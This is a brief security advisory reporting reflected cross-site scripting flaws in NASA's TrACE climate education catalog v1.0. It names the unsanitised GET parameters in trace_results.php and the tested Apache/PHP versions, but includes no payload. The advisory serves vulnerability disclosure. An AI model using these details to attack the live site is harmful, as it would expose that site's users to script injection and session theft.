NASA Tri-Agency Climate Education (TrACE) v1.0 Multiple XSS Vulnerabilities


Vendor: NASA
Product web page: http://www.nasa.gov
Affected version: 1.0

Summary: The Tri-Agency Climate Education (TrACE) Catalog provides search and
browse access to a catalog of educational products and resources. TrACE focuses
on climate education resources that have been developed by initiatives funded
through NASA, NOAA, and NSF, comprising a tri-agency collaboration around
climate education.

Desc: The application suffers from a reflected cross-site scripting vulnerability
when input is passed to the 'product_id', 'pi', 'project_id' and 'funder' GET parameters
in 'trace_results.php' script which is not properly sanitised before being returned
to the user. This can be exploited to execute arbitrary HTML and script code in a
user's browser session in context of an affected site.

Tested on: Apache/2.2.21
           PHP 5.2.17
